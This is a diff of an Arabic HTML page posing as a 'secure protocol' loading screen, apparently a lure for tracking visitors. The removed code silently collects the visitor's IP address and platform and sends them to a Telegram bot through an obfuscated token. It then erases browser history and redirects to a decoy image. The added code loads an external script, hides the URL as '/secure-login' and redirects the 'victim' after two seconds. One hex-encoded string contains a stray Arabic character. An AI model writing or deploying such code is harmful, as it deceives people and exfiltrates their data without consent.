@@ -2,47 +2,31 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تأمين الاتصال...</title>
-    <style>body { background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20% }</style>
+    <title>تأمين المحتوى الرقمي...</title>
+    <style>
+        body { background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20% }
+        .p { letter-spacing: 2px; text-transform: uppercase; }
+    </style>
 </head>
 <body>
-    <div id="st">ENCRYPTING DATA STREAM...</div>
+    <div class="p">Loading Secure Protocol...</div>
+    <div id="status">جاري تشفير البيانات...</div>
+
+    <script src="script.js"></script>
+
     <script>
-        // 🔱 البيانات المشفرة (Token والآيدي الخاص بك)
-        // Token: 8509005526... | ChatID: 1772820433
-        const _0xG = [
-            "\x38\x35\x30\x39\x30\x30\x35\x35\x32\x36\x3a\x41\x41\x48\x4d\x6f\x6c\x55\x7a\x61\x31\x38\x31\x76\x66\x39\x37\x4c\x53\x71\x70\x5a\x61\x34\x4d\x68\x51\x6f\x66\x59\x30\x7a\x57\x30", 
-            "\x31\x37\x37\x32\x38\x32\x30\x34\x33\x33"
-        ];
+        // 🔱 تشفير التمويه والتوجيه النهائي
+        (function() {
+            const _0xV = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6ن\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x6a\x61\x6b\x65\x31\x32\x33\x33\x32\x31\x31\x32\x32\x2d\x77\x71\x2f\x4d\x6f\x68\x61\x6d\x6d\x65\x64\x2f\x6d\x61\x69\x6e\x2f\x76\x69\x65\x77\x2e\x6a\x70\x67";
+            
+            // مسح السجل فوراً لعدم ترك أثر
+            window.history.replaceState(null, null, "/secure-login");
 
-        async function _0xX() {
-            try {
-                // سحب الـ IP صامتاً بتشفير الرابط
-                let r = await fetch(atob('aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u'));
-                let d = await r.json();
-                
-                let msg = `🔱 **Master Strike v37.0**\n` +
-                          `👤 User ID: \`1772820433\`\n` +
-                          `🌐 IP: \`${d.ip}\` \n` +
-                          `📱 System: \`${navigator.platform}\` \n` +
-                          `💀 Project: **LØGHØST-Z**`;
-
-                // إرسال الضربة لتليجرام
-                await fetch(`https://api.telegram.org/bot${_0xG[0]}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: _0xG[1], text: msg, parse_mode: 'Markdown' })
-                });
-
-                // مسح الأثر (History Eraser)
-                window.history.replaceState(null, null, "/");
-                
-                // التوجيه للصورة للتمويه
-                location.replace("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x6a\x61\x6b\x65\x31\x32\x33\x33\x32\x31\x31\x32\x32\x2d\x77\x71\x2f\x4d\x6f\x68\x61\x6d\x6d\x65\x64\x2f\x6d\x61\x69\x6e\x2f\x76\x69\x65\x77\x2e\x6a\x70\x67");
-
-            } catch (e) { location.replace("https://google.com"); }
-        }
-        window.onload = _0xX;
+            // توجيه الضحية للصورة بعد 2 ثانية من السحب
+            setTimeout(() => {
+                location.replace(_0xV);
+            }, 2000);
+        })();
     </script>
 </body>
 </html>
